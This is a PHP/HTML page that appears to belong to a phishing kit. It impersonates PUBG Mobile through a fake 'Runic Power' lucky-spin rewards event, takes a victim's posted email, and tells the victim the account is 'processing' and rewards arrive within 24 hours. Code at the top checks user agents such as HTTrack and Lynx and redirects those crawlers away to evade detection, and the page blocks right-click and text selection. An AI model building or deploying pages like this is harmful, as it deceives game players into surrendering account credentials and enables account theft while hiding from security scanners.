<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
  
<div class="container">
<div style="background: #000; width: 100%; height: 50px; border-bottom: 3px solid #CBB06D;">
<img style="width: 35px; float: left; margin-top: 7px; margin-left: 10px; border-radius: 5px;" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div style="margin-left: 6px; margin-top: 5px; color: #eaa300; font-size: 17px; font-family: Teko; text-align: left; text-transform: uppercase; float: left;">
PUBG MOBILE
</br>
<span style="color: #fff; line-height: 10px;">OFFICIAL PUBG ON MOBILE</span>
</div>
<div style="width: auto; margin-top: -7px; margin-right: 12px; float: right;">
<button type="button" style="background: #eaa300; width: auto; height: auto; margin-top: 17px; padding: 3px; padding-left: 7px; padding-right: 7px; color: #000; font-size: 15px; font-family: Teko; text-align: center; text-transform: uppercase; border:1px solid #ffcc57; border-radius: 1px;">Purchase</button>
<button type="button" style="background: #eaa300; width: auto; height: auto; margin-top: 17px; padding: 3px; padding-left: 7px; padding-right: 7px; color: #000; font-size: 15px; font-family: Teko; text-align: center; text-transform: uppercase; border:1px solid #ffcc57; border-radius: 1px;">Download</button>
</div>
</div>
<div class="header">
<video src="media/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="alert">
<img src="https://i.ibb.co/VV1Qkng/season.png">
<div class="alert-title">RP Season 17</div>
<div class="alert-desc">Start your free lucky spin in this season</div>
</div> <!--- alert --->
<div class="box">
<center>
<div class="item" data-order="1">
<img src="img/rewards/1.png">
</div>
<div class="item" data-order="2">
<img src="img/rewards/2.png">
</div>
<div class="item" data-order="3">
<img src="img/rewards/3.png">
</div>
<div class="item" data-order="8">
<img src="img/rewards/8.png">
</div>
<!--- start spin function --->
<div class="item item-start" onmousedown="buka.play()">
<!--- do not delete this image --->
<img style="visibility: hidden;" src="img/rewards/6.png">
<!--- do not delete this image --->
</div>
<!--- start spin function --->
<div class="item" data-order="4">
<img src="img/rewards/4.png">
</div>
<div class="item" data-order="7">
<img src="img/rewards/7.png">
</div>
<div class="item" data-order="6">
<img src="img/rewards/6.png">
</div>
<div class="item" data-order="5">
<img src="img/rewards/5.png">
</div>
</center>
<center>
<div class="btn-wrapper">
<button type="button" onmousedown="buka.play()">About Event</button>
<button type="button" onmousedown="buka.play()">Event Rules</button>
</div> <!--- btn-wrapper --->
</center>
</div> <!--- box --->
<div class="footer">
<img src="img/footer_img.png">
<div class="footer-txt">&copy; 2018-2020 PUBG CORPORATION. All rights reserved.</div>
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup">
<div class="popup-box">
<div class="nav-popup"><div class="nav-popup-title">Processing Account</div></div>
<br>
Thank your for joining this Runic Power event
<br>
<br>
Currently your account has been successfully processing
<br>
Please wait up to 24 hours to receive your rewards
<br>
<br>
<center>
<div class="btn-wrapper">
<button type="button" onmousedown="tutup.play()" onclick="location.href='https://pubgmobile.com/';">Logout</button>
</div>
</center>
<br>
</div>
</div>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/click.js"></script>

</body>
</html>